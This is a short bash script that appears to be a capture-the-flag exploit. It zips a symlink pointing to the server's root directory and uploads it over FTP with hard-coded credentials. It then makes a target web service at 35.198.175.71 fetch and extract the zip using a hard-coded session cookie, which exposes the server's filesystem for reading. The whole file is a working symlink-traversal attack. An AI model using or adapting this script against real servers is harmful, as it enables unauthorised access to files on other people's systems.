#!/bin/bash

## script is uploading single symlink on the servers
zipname="test.zip"
ftp_serv="ftp://mkwk018.cba.pl"
ftp_user="ctfish@ctfish.cba.pl"
ftp_passwd="Haslo123"
php_ssid="PHPSESSID=rgmisfpqe7n9a6gubun94vcspb"
read path
# ln -sf $path temp
# zip --symlinks $zipname temp
ln -s / .AAA
zip --symlink "test.zip" .AAA
curl -T $zipname $ftp_serv --user $ftp_user:$ftp_passwd
file=`curl "http://35.198.175.71/?url=http%3A%2F%2Fctfish.cba.pl%2F$zipname" -H "Cookie: $php_ssid" --compressed | grep -o 'files/[^"]*'`
rm $zipname
rm temp
echo 'http://35.198.175.71/'$file
